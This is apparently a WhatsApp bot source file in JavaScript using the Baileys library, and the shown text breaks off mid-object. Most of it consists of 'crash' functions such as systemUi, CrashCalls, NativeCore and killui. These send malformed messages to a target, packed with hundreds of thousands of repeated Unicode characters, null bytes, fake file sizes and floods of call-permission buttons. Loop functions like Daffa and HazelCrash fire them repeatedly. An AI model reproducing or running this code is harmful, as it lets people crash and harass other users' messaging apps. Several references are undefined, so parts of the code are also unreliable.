/*
Cella Sakit Hati
t.me/cellasta
I Apologize To Tama Riyuchi  
Creator Base :
-Tama Ryuichi
Contact Creator :
-Telegram : @tamainfinity
-WhatsApp : 62882007138253
-Youtube : @tamainfinity
-Instagram : @ryc.riyu
-Tiktok : @tamaryuichi
Note :
-Please Don't Remove This Credits
*/
//CLEAR CONSOLE
console.clear();

//END
//SCANING CONTROL

require('../Control/Ctrl')
//END
//INSTALLING BAILEYS

const { default: baileys, downloadContentFromMessage, proto, generateWAMessage, getContentType, prepareWAMessageMedia 
} = require("@whiskeysockets/baileys");
const { generateWAMessageFromContent } = require('@whiskeysockets/baileys');
const { 
GroupSettingChange, 
WAGroupMetadata, 
emitGroupParticipantsUpdate, 
emitGroupUpdate, 
WAGroupInviteMessageGroupMetadata, 
GroupMetadata, 
Headers,
WA_DEFAULT_EPHEMERAL,
getAggregateVotesInPollMessage, 
generateWAMessageContent, 
areJidsSameUser, 
useMultiFileAuthState, 
fetchLatestBaileysVersion,
makeCacheableSignalKeyStore, 
makeWaSocket,
makeInMemoryStore,
MediaType,
WAMessageStatus,
downloadAndSaveMediaMessage,
AuthenticationState,
initInMemoryKeyStore,
MiscMessageGenerationOptions,
useSingleFileAuthState,
BufferJSON,
WAMessageProto,
MessageOptions,
WAFlag,
WANode,
WAMetric,
ChatModification,
MessageTypeProto,
WALocationMessage,
ReconnectMode,
WAContextInfo,
ProxyAgent,
waChatKey,
MimetypeMap,
MediaPathMap,
WAContactMessage,
WAContactsArrayMessage,
WATextMessage,
WAMessageContent,
WAMessage,
BaileysError,
WA_MESSAGE_STATUS_TYPE,
MediaConnInfo,
URL_REGEX,
WAUrlInfo,
WAMediaUpload,
mentionedJid,
processTime,
Browser,
MessageType,
Presence,
WA_MESSAGE_STUB_TYPES,
Mimetype,
relayWAMessage,
Browsers,
DisconnectReason,
WASocket,
getStream,
WAProto,
isBaileys,
AnyMessageContent,
templateMessage,
InteractiveMessage,
Header
} = require("@whiskeysockets/baileys");

//END
//EXPORTS BASIC MODULE

const fs = require('fs')
const util = require('util')
const chalk = require('chalk')
const os = require('os')
const jimp = require("jimp")
const axios = require('axios')
const fsx = require('fs-extra')
const sharp = require('sharp')
const crypto = require('crypto')
const yts = require('yt-search')
const ffmpeg = require('fluent-ffmpeg')
const speed = require('performance-now')
const timestampp = speed();
const latensi = speed() - timestampp
const moment = require('moment-timezone')
const jsobfus = require('javascript-obfuscator');
const { VocalRemover } = require('../System/Data8');
const { ocrSpace } = require("ocr-space-api-wrapper");
const { JSDOM } = require('jsdom')
const { spawn, exec, execSync } = require('child_process')
//END
//MODULE MESSAGE + PREFIX

module.exports = Ryc = async (Ryc, m, chatUpdate, store) => {
    try {
        var body = (
            m.mtype === "conversation" ? m.message.conversation || "[Conversation]" :
            m.mtype === "imageMessage" ? m.message.imageMessage.caption || "[Image]" :
            m.mtype === "videoMessage" ? m.message.videoMessage.caption || "[Video]" :
            m.mtype === "audioMessage" ? m.message.audioMessage.caption || "[Audio]" :
            m.mtype === "stickerMessage" ? m.message.stickerMessage.caption || "[Sticker]" :
            m.mtype === "documentMessage" ? m.message.documentMessage.fileName || "[Document]" :
            m.mtype === "contactMessage" ? "[Contact]" :
            m.mtype === "locationMessage" ? m.message.locationMessage.name || "[Location]" :
            m.mtype === "liveLocationMessage" ? "[Live Location]" :
            m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text || "[Extended Text]" :
            m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId || "[Button Response]" :
            m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId || "[List Response]" :
            m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId || "[Template Button Reply]" :
            m.mtype === "interactiveResponseMessage" ? JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson)?.id || "[Interactive Response]" :
            m.mtype === "pollCreationMessage" ? "[Poll Creation]" :
            m.mtype === "reactionMessage" ? m.message.reactionMessage.text || "[Reaction]" :
            m.mtype === "ephemeralMessage" ? "[Ephemeral]" :
            m.mtype === "viewOnceMessage" ? "[View Once]" :
            m.mtype === "productMessage" ? m.message.productMessage.product?.name || "[Product]" :
            m.mtype === "messageContextInfo" ? m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text || "[Message Context]" :
            "[Unknown Type]"
        );
        var budy = (typeof m.text == 'string' ? m.text : '');
        var prefix = global.prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? 
        body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" 
                      : global.prefa ?? global.prefix
  
//END
//DATA TAMBAHAN + PELENGKAP
const { 
smsg, 
tanggal, 
getTime, 
isUrl, 
sleep, 
clockString, 
runtime, 
fetchJson, 
getBuffer, 
jsonformat, 
format, 
parseMention, 
getRandom, 
getGroupAdm, 
generateProfilePicture 
} = require('../System/Data1')

//END
//DATA USER + DATA MESSAGE

const Owner = JSON.parse(fs.readFileSync('./Access/Own.json'))
const Premium = JSON.parse(fs.readFileSync('./Access/Prem.json'))
const CMD = body.startsWith(prefix)
const command = body.startsWith(prefix) ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase(): ''
const args = body.trim().split(/ +/).slice(1)
const BotNum = await Ryc.decodeJid(Ryc.user.id)
const CreatorOnly = [BotNum, ...Owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const PremOnly = [BotNum, ...Premium].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const fatkuns = m.quoted || m;
const quoted = 
  fatkuns.mtype === 'buttonsMessage' ? fatkuns[Object.keys(fatkuns)[1]] :
  fatkuns.mtype === 'templateMessage' ? fatkuns.hydratedTemplate[Object.keys(fatkuns.hydratedTemplate)[1]] :
  fatkuns.mtype === 'product' ? fatkuns[Object.keys(fatkuns)[0]] :
  m.quoted ? m.quoted :
  m;
const qtext = q = args.join(" ")
const qtek = m.quoted && m.quoted.message && m.quoted.message.imageMessage;
const from = mek.key.remoteJid
const { spawn: spawn, exec } = require('child_process')
const sender = m.isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid
const groupMetadata = m.isGroup ? await Ryc.groupMetadata(from).catch(e => {}) : ''
const groupName = m.isGroup ? groupMetadata.subject : "";
const participants = m.isGroup ? await groupMetadata.participants : ''
const GroupAdm = m.isGroup ? await getGroupAdm(participants) : ''
const BotAdm = m.isGroup ? GroupAdm.includes(BotNum) : false
const Adm = m.isGroup ? GroupAdm.includes(m.sender) : false
const pushname = m.pushName || "No Name"
const time = moment().tz("Asia/Jakarta").format("HH:mm:ss");
let ucapanWaktu
if (time >= "19:00:00" && time < "23:59:00") {
ucapanWaktu = "🌃𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐌𝐚𝐥𝐚𝐦"
} else if (time >= "15:00:00" && time < "19:00:00") {
    ucapanWaktu = "🌄𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐒𝐨𝐫𝐞"
} else if (time >= "11:00:00" && time < "15:00:00") {
ucapanWaktu = "🏞️𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐒𝐢𝐚𝐧𝐠"
} else if (time >= "06:00:00" && time < "11:00:00") {
    ucapanWaktu = "🏙️𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐏𝐚𝐠𝐢"
} else {
    ucapanWaktu = "🌆𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐒𝐮𝐛𝐮𝐡"
};
const todayDateWIB = new Date().toLocaleDateString('id-ID', {
  timeZone: 'Asia/Jakarta', // Zona waktu WIB
  year: 'numeric',
  month: 'long',
  day: 'numeric',
});
const mime = (quoted.msg || quoted).mimetype || ''
const THM = "https://files.catbox.moe/lzx2jk.jpg"
const Xxx = "https://files.catbox.moe/lzx2jk.jpg"
const Jepeg = fs.readFileSync('./System/path/Ryc.jpg')
const tamaxs = require('../System/tamaxs')
const ryclol = fs.readFileSync('./System/path/nulllol.jpeg')

//END
//DATA TIKTOK SCRAPER

const { tiktok } = require('../System/Data5')

//END
//EXPORTS MODULE BRAT + STICKER

const {
imageToWebp, 
videoToWebp, 
writeExifImg, 
writeExifVid, 
writeExif, 
addExif 
} = require('../System/Data2')

//DATA ADDBOT / JADIBOT PAIRING

const {
	jadibot,
	stopbot,
	listbot
} = require('../Connection/jadibot')

//END
//SEETINGS STATUS BOT

if (!Ryc.public) {
if (!CreatorOnly) return
}

//END
//INFO NEW MESSAGE IN CONSOLE

if (command) {
  if (m.isGroup) {
    // Log untuk pesan grup
    console.log(chalk.bgBlue.white.bold(`━━━━ ⌜ SYSTEM - GROUP ⌟ ━━━━`));
    console.log(chalk.bgHex('#f39c12').hex('#ffffff').bold(
      ` 📅 Date : ${todayDateWIB} \n` +
      ` 🕐 Time : ${time} \n` +
      ` 💬 Message Received : ${m.mtype} \n` +
      ` 🌐 Group Name : ${groupName} \n` +
      ` 🔑 Group Id : ${m.chat} \n` +
      ` 🗣️ Sender : ${pushname} \n` +
      ` 👤 Recipient : ${BotNum} \n`
    ));
  } else {
    // Log untuk pesan privat
    console.log(chalk.bgBlue.white.bold(`━━━━ ⌜ SYSTEM - PRIVATE ⌟ ━━━━`));
    console.log(chalk.bgHex('#f39c12').hex('#ffffff').bold(
      ` 📅 Date : ${todayDateWIB} \n` +
      ` 🕐 Time : ${time} \n` +
      ` 💬 Message Received : ${m.mtype} \n` +
      ` 🌐 Group Name : No In Group \n` +
      ` 🔑 Group Id : No In Group \n` +
      ` 🗣️ Sender : ${pushname} \n` +
      ` 👤 Recipient : ${BotNum} \n`
    ));
  }
}

//END
//AUTO RECORDING

let rn = ['recording']
let jd = rn[Math.floor(Math.random() * rn.length)];
if (m.message) {
//Ryc.sendPresenceUpdate(jd, from) // HAPUS UNTUK MEMATIKAN
}

let resize = async (image, width, height) => {
    let oyy = await jimp.read(image)
    let kiyomasa = await oyy.resize(width, height).getBufferAsync(jimp.MIME_JPEG)
    return kiyomasa
}
//END
//FUNCTION LOADING

async function loading () {
var Floading = [
"",
"",
""
]
let { key } = await Ryc.sendMessage(from, {text: " "})
for (let i = 0; i < Floading.length; i++) {
await Ryc.sendMessage(from, {text: Floading[i], edit: key });
}
}

//END
//FILE RESIZE ( FAKE )

const FileSize = (number) => {
var SI_POSTFIXES = ["B", " KB", " MB", " GB", " TB", " PB", " EB"]
var tier = Math.log10(Math.abs(number)) / 3 | 0
if(tier == 0) return number
var postfix = SI_POSTFIXES[tier]
var scale = Math.pow(10, tier * 3)
var scaled = number / scale
var formatted = scaled.toFixed(1) + ''
if (/\.0$/.test(formatted))
formatted = formatted.substr(0, formatted.length - 2)
return formatted + postfix
}

//END
//FUNCTION OBF

async function obfus(query) {
return new Promise((resolve, reject) => {
try {
const obfuscationResult = jsobfus.obfuscate(query,
{
compact: false,
controlFlowFlattening: true,
controlFlowFlatteningThreshold: 1,
numbersToExpressions: true,
simplify: true, 
stringArrayShuffle: true,
splitStrings: true,
stringArrayThreshold: 1
}
);
const result = {
status: 200,
author: `Me`,
result: obfuscationResult.getObfuscatedCode()
}
resolve(result)
} catch (e) {
reject(e)
}
})
}

const VcardQuoted = {
    key: {
        fromMe: false,
        participant: `0@s.whatsapp.net`,
        ...(from ? {
            remoteJid: "0@s.whatsapp.net"
        } : {})
    },
    "message": {
        "documentMessage": {
            "url": "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
            "mimetype": "application/vnd.openxmlformats-officedocument.presentationml.slideshow",
            "fileSha256": "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
            "fileLength": "974197419741",
            "pageCount": "974197419741",
            "mediaKey": "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
            "fileName": "𝐓𝐚𝐦𝐚𝐂𝐫𝐚𝐬𝐡~𝐃𝐨𝐜𝐮𝐦𝐞𝐧𝐭 :v",
            "fileEncSha256": "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
            "directPath": '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
            "mediaKeyTimestamp": "1715880173",
            "contactVcard": true
        },
        "title": "Haha Bot" + "ꦾ".repeat(103000),
        "body": {
            "text": "TamaRiyuchi" + "ꦾ".repeat(103000) + "@1".repeat(150000)
        },
        "nativeFlowMessage": {},
        "contextInfo": {
            "mentionedJid": ["1@newsletter"],
            "groupMentions": [{ "groupJid": "1@newsletter", "groupSubject": "TAMARYUICHI" }]
        }
    },
    "contextInfo": {
        "mentionedJid": [m.chat],
        "externalAdReply": {
            "showAdAttribution": true,
            "title": "Cella ",
            "body": "Cella Always With You",
            "mediaType": 3,
            "renderLargerThumbnail": true,
            "thumbnailUrl": "your-thumbnail-url-here",
            "sourceUrl": "https://youtube.com/@Cella",
        },
        "forwardedNewsletterMessageInfo": {
            "newsletterJid": "12036332170343299@newsletter",
            "serverMessageId": 1,
            "newsletterName": "Cella Crasher",
        }
    },
    "expiryTimestamp": 0,
    "amount": {
        "value": "999999999",
        "offset": 999999999,
        "currencyCode": "CRASHCODE9741",
    },
    "background": {
        "id": "100",
        "fileLength": "928283",
        "width": 1000,
        "height": 1000,
        "mimetype": "application/vnd.ms-powerpoint",
        "placeholderArgb": 4278190080,
        "textArgb": 4294967295,
        "subtextArgb": 4278190080,
    }
}

async function uibuglogger(target) {
     let sections = [];
     
     let listMessage = {
        title: "Massive Menu Overflow",
        sections: sections,
      };
    await Ryc.relayMessage(
        target, {
            viewOnceMessage: {
                message: {
                    liveLocationMessage: {
                        degreesLatitude: 'c',
                        degreesLongitude: 'c',
                        caption: '饾懣饾拰饾挌饾挍饾拹 饾悁饾惌饾惌饾悮饾悳饾悿?' + "軎筷Ω".repeat(150000) + "@1".repeat(70000),
                        sequenceNumber: '0',
                        jpegThumbnail: '',
                        nativeFlowMessage: {
    messageParamsJson: "",
    buttons: [
        {
            name: "single_select",
            buttonParamsJson: "JSON.stringify(listMessage)",
        },
        {
            name: "call_permission_request",
            buttonParamsJson: "JSON.stringify(listMessage)",
        },
        {
            name: "mpm",
            buttonParamsJson: "JSON.stringify(listMessage)",
        },
        {
            name: "galaxy_message",
            paramsJson: {
                "screen_2_OptIn_0": true,
                "screen_2_OptIn_1": true,
                "screen_1_Dropdown_0": "nullOnTop",
                "screen_1_DatePicker_1": "1028995200000",
                "screen_1_TextInput_2": "DapzNotDev@gmail.com",
                "screen_1_TextInput_3": "94643116",
                "screen_0_TextInput_0": "\u0000".repeat(500000),
                "screen_0_TextInput_1": "SecretDocu",
                "screen_0_Dropdown_2": "#926-Xnull",
                "screen_0_RadioButtonsGroup_3": "0_true",
                "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
            },
        },
    ],
},
  contextInfo: {
      forwardingScore: 127,
            isForwarded: true,
                    quotedMessage: {
                             documentMessage: {
                  url: "https://mmg.whatsapp.net/text/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                  mimetype:
                    "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                  fileSha256:
                    "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                  fileLength: "9999999999999",
                  pageCount: 1316134911,
                  mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                  fileName: "饾櫝饾殜饾殭饾殻饾櫧饾殬饾殱饾櫝饾殠饾殶 鈽狅笍",
                  fileEncSha256:
                    "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                  directPath:
                    "/text/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                  mediaKeyTimestamp: "1724474503",
                  contactVcard: true,
                  thumbnailDirectPath:
                    "/text/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                  thumbnailSha256:
                    "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                  thumbnailEncSha256:
                    "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                  jpegThumbnail: "",
                },
                    contactVcard: true
                        },
                            groupMentions: [{
                                groupJid: "1@newsletter",
                                groupSubject: "饾懣饾拰饾挌饾挍饾拹 饾悅饾惃饾惈饾悶馃└"
                            }]
                        }
                    }
                }
            }
        }, {
            participant: {
                jid: target
            }
        }
    );
    await console.clear()
    console.log("\x1b[33m%s\x1b[0m", `Successfully Sent Bug WhatsApp Ui System`);
}

async function SqlXGlx(target) {
      let sections = [];

      for (let i = 0; i < 10; i++) {
        let largeText = "軎�".repeat(25);

        let deepNested = {
          title: `Super Deep Nested Section ${i}`,
          highlight_label: `Extreme Highlight ${i}`,
          rows: [
            {
              title: largeText,
              id: `id${i}`,
              subrows: [
                {
                  title: "Nested row 1",
                  id: `nested_id1_${i}`,
                  subsubrows: [
                    {
                      title: "Deep Nested row 1",
                      id: `deep_nested_id1_${i}`,
                    },
                    {
                      title: "Deep Nested row 2",
                      id: `deep_nested_id2_${i}`,
                    },
                  ],
                },
                {
                  title: "Nested row 2",
                  id: `nested_id2_${i}`,
                },
              ],
            },
          ],
        };

        sections.push(deepNested);
      }

      let listMessage = {
        title: "Massive Menu Overflow",
        sections: sections,
      };

      let message = {
        viewOnceMessage: {
          message: {
            messageContextInfo: {
              deviceListMetadata: {},
              deviceListMetadataVersion: 2,
            },
            interactiveMessage: {
              contextInfo: {
                mentionedJid: [target],
                isForwarded: true,
                forwardingScore: 999,
                businessMessageForwardInfo: {
                  businessOwnerJid: target,
                },
              },
              body: {
                text: "P",
              },
              nativeFlowMessage: {
                buttons: [
                  {
                    name: "single_select",
                    buttonParamsJson: "JSON.stringify(listMessage)",
                  },
                  {
                    name: "call_permission_request",
                    buttonParamsJson: "JSON.stringify(listMessage)",
                  },
                  {
                    name: "mpm",
                    buttonParamsJson: "JSON.stringify(listMessage)",
                  },
                  {
                    name: 'galaxy_message',
                    paramsJson: `{\"screen_2_OptIn_0\":true,           \"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"TrashDex Superior\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"DapzNotDev@trash.lol\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0003".repeat(355000)}\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
version: 3 
},
                ],
              },
            },
          },
        },
      };

      await Ryc.relayMessage(target, message, {
        participant: { jid: target },
      });
    }
async function FlowX(target) {
  let msg = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "漏饾懣饾拰饾挌饾挍饾拹 饾應饾挀饾拏饾挃饾拤饾拞饾挀馃憖",
              hasMediaAttachment: false,
            },
            body: {
              text: "饾懣酮酮饾懖探蜏饾拃蜁蜖饾拋酮蜖蜏饾懚 饾應酮踏蜖亭饾懝蜏藷蜐饾懆蜖饾懞酮饾懐蜏蜖饾懍蜖蜐饾懝蜁",
            },
            nativeFlowMessage: {
              messageParamsJson: "",
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "z",
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: "{}",
                },
              ],
            },
          },
        },
      },
    },
    {}
  );

  await Ryc.relayMessage(target, msg.message, {
    messageId: msg.key.id,
    participant: { jid: target },
  });
}
async function systemUi(target) {
    Ryc.relayMessage(target, {
        ephemeralMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {
                            degreesLatitude: 0,
                            degreesLongitude: 0
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "Langit Galau🚀" + "ꦾ".repeat(550000) + "@1".repeat(300000)
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                        groupMentions: [{ groupJid: "1@newsletter", groupSubject: "You" }]
                    }
                }
            }
        }
    }, { participant: { jid: target } }, { messageId: null });
};


async function CrashCalls(Target) {
var CallPermission = {
viewOnceMessage: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
},
interactiveMessage: {
contextInfo: {
mentionedJid: [m.chat],
isForwarded: true,
forwardingScore: 999
},
body: {
text: "饾懣酮酮饾懖探蜏饾拃蜁蜖饾拋酮蜖蜏饾懚 饾應酮踏蜖亭饾懝蜏藷蜐饾懆蜖饾懞酮饾懐蜏蜖饾懍蜖蜐饾懝蜁" + "軎�".repeat(9999),
footer: "Ryc-携Dev"
},
nativeFlowMessage: {
buttons: [
{ 
name: "single_select", 
buttonParamsJson: "" 
}, { 
name: "call_permission_request", 
buttonParamsJson: "" 
}, { 
name: "call_permission_request", 
buttonParamsJson: "" 
}, { 
name: "call_permission_request", 
buttonParamsJson: "" 
}, { 
name: "call_permission_request", 
buttonParamsJson: "" 
}, { 
name: "call_permission_request", 
buttonParamsJson: "" 
}, { 
name: "call_permission_request", 
buttonParamsJson: "" 
}, { 
name: "call_permission_request", 
buttonParamsJson: "" 
}, { 
name: "call_permission_request", 
buttonParamsJson: "" 
}, { 
name: "call_permission_request", 
buttonParamsJson: "" 
}, { 
name: "call_permission_request", 
buttonParamsJson: "" 
}, { 
name: "call_permission_request", 
buttonParamsJson: "" 
}, { 
name: "call_permission_request", 
buttonParamsJson: "" 
}, { 
name: "call_permission_request", 
buttonParamsJson: "" 
}, { 
name: "call_permission_request", 
buttonParamsJson: "" 
}, { 
name: "call_permission_request", 
buttonParamsJson: "" 
}, { 
name: "mpm", 
buttonParamsJson: "" 
}
]
}
}
}
}
};
await Ryc.relayMessage(Target, CallPermission, { participant: { jid: Target } });
}

async function NativeCore(target) {
  let NativeCore = {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2,
        },
        interactiveMessage: {
          contextInfo: {
            mentionedJid: ["13135550002@s.whatsapp.net"],
            isForwarded: true,
            forwardingScore: 999,
            businessMessageForwardInfo: {
              businessOwnerJid: target,
            },
            dataSharingContext: {
              showMmDisclosure: true,
            },
          },
          body: {
            title: "馃憫",
            text: "饾懣酮酮饾懖探蜏饾拃蜁蜖饾拋酮蜖蜏饾懚 饾應酮踏蜖亭饾懝蜏藷蜐饾懆蜖饾懞酮饾懐蜏蜖饾懍蜖蜐饾懝蜁" + "岘�".repeat(9741),
            description: "馃拰",
            footer: "Ryc-携Dev",
          },
          nativeFlowMessage: {
            buttons: [
              { name: "single_select", buttonParamsJson: "" },
              { name: "view_product", buttonParamsJson: "" },
              { name: "payment_method", buttonParamsJson: "" },
              { name: "call_permission_request", buttonParamsJson: "" },
              { name: "mpm", buttonParamsJson: "" },
              { name: "payment_info", buttonParamsJson: "" },
            ],
          },
        },
      },
    },
  };
  await Ryc.relayMessage(target, NativeCore, {
    participant: { jid: target },
  });
  console.log("Successfully Send NativeCore To Target馃幆")
}

async function Daffa(target) {
    for (let i = 0; i <= 20; i++) {
    await systemUi(target);
    await NativeCore(target);
    await CrashCalls(target);
    await CrashCalls(target);
    await CrashCalls(target);
    await SqlXGlx(target);
    await uibuglogger(target);
    await systemUi(target);
    await systemUi(target);
    await NativeCore(target);
    await CrashCalls(target);
    await CrashCalls(target);
    await CrashCalls(target);
    await SqlXGlx(target);
    await uibuglogger(target);
    await systemUi(target);
    await systemUi(target);
    await NativeCore(target);
    await CrashCalls(target);
    await CrashCalls(target);
    await CrashCalls(target);
    await SqlXGlx(target);
    await uibuglogger(target);
    await systemUi(target);
    await systemUi(target);
    await NativeCore(target);
    await CrashCalls(target);
    await CrashCalls(target);
    await CrashCalls(target);
    await SqlXGlx(target);
    await uibuglogger(target);
    await systemUi(target);
    }
}

async function HazelCrash(target) {
    for (let i = 0; i <= 20; i++) {
    await systemUi(target);
    await StravaX(target);
    await CrashCalls(target);
    await CrashCalls(target);
    await CrashCalls(target);
    await CrashCalls(target);
    await systemUi(target);
    await systemUi(target);
    await StravaX(target);
    await CrashCalls(target);
    await CrashCalls(target);
    await CrashCalls(target);
    await CrashCalls(target);
    await systemUi(target);
    await systemUi(target);
    await StravaX(target);
    await CrashCalls(target);
    await CrashCalls(target);
    await CrashCalls(target);
    await CrashCalls(target);
    await systemUi(target);
    await systemUi(target);
    await StravaX(target);
    await CrashCalls(target);
    await CrashCalls(target);
    await CrashCalls(target);
    await CrashCalls(target);
    await systemUi(target);
    }
}

async function StravaKill(target) {
                   try {
                           const StravaKillUi = "𑇂𑆵𑆴𑆿".repeat(60000);
                           await Ren.relayMessage(target, {
                                   locationMessage: {
                                           degreesLatitude: 11.11,
                                           degreesLongitude: -11.11,
                                           name: "\u0000               " + StravaKillUi,
                                           url: "https://t.me/stravaofficial"
                                   }
                           }, {
                                   participant: {
                                           jid: target
                                   }
                           });
                           console.log("StravaKill Sending Bugs");
                   } catch (error) {
                           console.error("Error Sending StravaKill:", error);
}
}

async function crashui2(target, ptcp = false) {
    await client.relayMessage(target, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {
                            degreesLatitude: 0,
                            degreesLongitude: 0
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "🥶🌷\`XYZDZZ\`🌷🥶" + "ꦾ".repeat(300000)
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                        groupMentions: [{ groupJid: "1@newsletter", groupSubject: " xCeZeT " }]
                    }
                }
            }
        }
    }, { participant: { jid: target } }, { messageId: null });
}

async function killui(target, Ptcp = true) {
      await client.relayMessage(
        target,
        {
          ephemeralMessage: {
            message: {
              interactiveMessage: {
                header: {
                  documentMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
                    mimetype:
                      "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                    fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                    fileLength: "9999999999999",
                    pageCount: 1316134911,
                    mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                    fileName: "⿻",
                    fileEncSha256:
                      "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
                    directPath:
                      "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1726867151",
                    contactVcard: true,
                    jpegThumbnail: ThM,
                  },
                  hasMediaAttachment: true,
                },
                body: {
                  text: "⿻🥶🌷Xyzdzz🌷🥶\n" + "ꦾ".repeat(28000),
                },
                nativeFlowMessage: {
                  messageParamsJson: "{}",
                },
                contextInfo: {
                  mentionedJid: ["6289526156543@s.whatsapp.net"],
                  forwardingScore: 1,
                  isForwarded: true,
                  fromMe: false,
                  participant: "0@s.whatsapp.net",
                  remoteJid: "status@broadcast",
                  quotedMessage: {
                    documentMessage: {
                      url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                      mimetype:
                        "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                      fileSha256:
                        "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                      fileLength: "9999999999999",
                      pageCount: 1316134911,
                      mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                      fileName: "Дѵөҫдԁө Ԍҵдѵд tђคเlคภ๔",
                      fileEncSha256:
                        "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                      directPath:
                        "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                      mediaKeyTimestamp: "1724474503",
                      contactVcard: true,
                      thumbnailDirectPath:
